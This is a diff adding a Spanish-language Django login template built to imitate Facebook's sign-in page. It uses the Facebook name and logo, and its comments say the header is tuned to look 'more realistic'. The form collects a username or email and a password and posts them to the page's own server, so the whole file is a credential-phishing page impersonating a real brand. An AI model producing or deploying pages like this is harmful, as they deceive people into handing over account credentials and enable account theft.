@@ -1,0 +1,122 @@
+﻿<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<title>Pruba - Iniciar sesión</title>
+
+<style>
+body {
+    font-family: Arial, sans-serif;
+    background-image: url('https://images.unsplash.com/photo-1522202176988-66273c2fd55f?auto=format&fit=crop&w=1950&q=80');
+    background-size: cover;
+    background-position: center;
+    margin: 0;
+}
+
+.container {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+}
+
+.login-box {
+    background-color: white;
+    padding: 40px;
+    border-radius: 8px;
+    box-shadow: 0 0 20px rgba(0,0,0,0.3);
+    width: 350px;
+}
+
+/* 🔥 HEADER MÁS REALISTA */
+.header {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+    margin-bottom: 25px;
+}
+
+/* texto más tipo app */
+.title {
+    font-size: 20px;
+    font-weight: 600;
+    color: #1877f2;
+    letter-spacing: 0.3px;
+    margin: 0;
+}
+
+/* logo más integrado */
+.logo {
+    width: 24px;
+    height: 24px;
+    object-fit: contain;
+}
+
+.login-box form input, 
+.login-box form button {
+    width: 100%;
+    padding: 12px;
+    margin: 8px 0;
+    border-radius: 6px;
+    font-size: 14px;
+    box-sizing: border-box;
+}
+
+.login-box form input {
+    border: 1px solid #ccc;
+}
+
+.login-box form button {
+    background-color: #2a3fb7;
+    border: none;
+    color: white;
+    font-weight: bold;
+    cursor: pointer;
+    font-size: 16px;
+}
+
+.login-box form button:hover {
+    background-color: #1e2f8a;
+}
+
+.forgot {
+    text-align: center;
+    margin-top: 10px;
+}
+
+.forgot a {
+    text-decoration: none;
+    color: #2a3fb7;
+    font-size: 14px;
+}
+</style>
+
+</head>
+<body>
+
+<div class="container">
+    <div class="login-box">
+
+        <!-- HEADER REALISTA -->
+        <div class="header">
+            <span class="title">facebook</span>
+            <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_(2019).png" alt="logo">
+        </div>
+
+        <form method="post">
+            {% csrf_token %}
+            <input type="text" name="username" placeholder="Usuario o correo" autocomplete="off">
+            <input type="password" name="password" placeholder="Contraseña" autocomplete="off">
+            <button type="submit">Iniciar sesión</button>
+        </form>
+
+        <div class="forgot">
+            <a href="#">¿Olvidaste tu contraseña?</a>
+        </div>
+
+    </div>
+</div>
+
+</body>
+</html>
